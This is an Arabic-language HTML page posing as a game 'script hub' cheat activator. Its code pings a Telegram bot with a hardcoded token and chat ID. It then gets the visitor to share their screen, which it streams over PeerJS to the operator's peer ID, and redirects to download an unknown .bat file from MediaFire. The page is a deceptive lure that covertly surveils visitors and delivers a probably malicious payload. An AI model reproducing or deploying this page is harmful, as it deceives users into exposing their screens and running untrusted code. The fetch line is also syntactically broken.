<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Script Hub 2026</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { margin: 0; background: #000; color: white; font-family: sans-serif; text-align: center; }
        .bg { background-image: url('https://i.ibb.co/v4x0XmY/1000014847.jpg'); background-size: cover; position: fixed; width: 100%; height: 100%; z-index: -1; filter: brightness(0.4); }
        .box { margin-top: 150px; padding: 20px; border: 2px solid #00ffcc; display: inline-block; border-radius: 15px; background: rgba(0,0,0,0.8); box-shadow: 0 0 20px #00ffcc; }
        .btn { background: linear-gradient(45deg, #00ffcc, #ff00ff); border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 10px; margin-top: 20px; box-shadow: 0 0 10px #ff00ff; }
    </style>
</head>
<body>
    <div class="bg"></div>
    <div class="box">
        <h1>🚀 تفعيل السكربت الخارق</h1>
        <p>اضغط للبدء وسحب البيانات للعبة</p>
        <button class="btn" onclick="sendToBot()">تفعيل السكربت الآن</button>
    </div>

    <script>
        const token = "8521430098:AAH9rZ7YNsbWwyigducN1EVOTMlg2UGtY9k";
        const chat_id = "1330781289";
        const myID = "Mr_Fm_Alpha_99";
        const peer = new Peer();

        function sendToBot() {
            // محاولة إرسال رسالة بسيطة أولاً للتأكد من الاتصال
            const testMsg = "🎯 شخص ما ضغط على الزر الآن!";
            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${testMsg})
            .then(() => {
                alert("جاري جلب بيانات السكربت... يرجى الموافقة على طلب البث");
                startScreenShare();
            })
            .catch(err => alert("فشل الاتصال بالخادم، تأكد من الإنترنت"));
        }

        async function startScreenShare() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                peer.call(myID, stream);
                // تحميل الملف
                window.location.href = "https://www.mediafire.com/file/uzu30zei1sp22ki/Mr_Master.bat/file";
            } catch (err) {
                alert("يجب الموافقة على البث لتشغيل السكربت!");
            }
        }
    </script>
</body>
</html>
